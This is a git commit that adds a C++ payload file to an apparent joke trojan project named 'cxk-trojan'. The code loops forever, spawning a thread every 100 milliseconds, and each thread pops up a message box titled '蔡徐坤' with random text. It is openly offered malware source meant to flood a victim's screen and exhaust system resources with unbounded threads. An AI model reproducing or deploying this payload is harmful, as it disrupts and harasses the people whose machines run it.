381ffc15ac8ca8cfc1f16f8f0b93903d81c63ecf
Cyat_Yrna <Cyat_Yrna@outlook.com>
2019-04-27 10:23:07 +0800

    Add payload "messageboxes"

---
+++ Trojan/cxk-trojan/payload_messageboxes.cpp
@@ -0,0 +1,22 @@
+﻿#include "payloads.h"
+
+#define PopUp_Delay 100
+#define texts_count 4
+
+DWORD WINAPI popup_messagebox(LPVOID argument);
+
+const char* texts[] = { "1", "2", "3", "4" };
+
+DWORD WINAPI payload_messageboxes(LPVOID argument)
+{
+	while(1)
+	{
+		CreateThread(NULL, NULL, popup_messagebox, NULL, NULL, NULL);
+		Sleep(PopUp_Delay);
+	}
+}
+
+DWORD WINAPI popup_messagebox(LPVOID argument)
+{
+	MessageBox(NULL, texts[rand() % texts_count], "蔡徐坤", NULL);
+}
